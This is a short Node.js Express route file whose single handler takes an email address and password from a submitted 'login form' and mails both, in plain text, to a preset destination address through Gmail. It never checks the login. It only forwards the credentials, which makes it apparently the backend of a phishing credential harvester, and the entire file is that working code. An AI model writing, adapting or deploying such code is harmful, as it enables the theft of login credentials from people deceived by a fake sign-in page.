const express = require('express');
const nodemailer = require('nodemailer');
const router = express.Router();
require('dotenv').config();

router.post('/send_email', express.urlencoded({ extended: true }), async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send('Missing fields');
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    }
  });

  const mailOptions = {
    from: email,
    to: process.env.DEST_EMAIL,
    subject: 'New Login Form Submission',
    text: `Email: ${email}\nPassword: ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.send('Email sent successfully.');
  } catch (err) {
    console.error(err);
    res.status(500).send('Failed to send email.');
  }
});

module.exports = router;
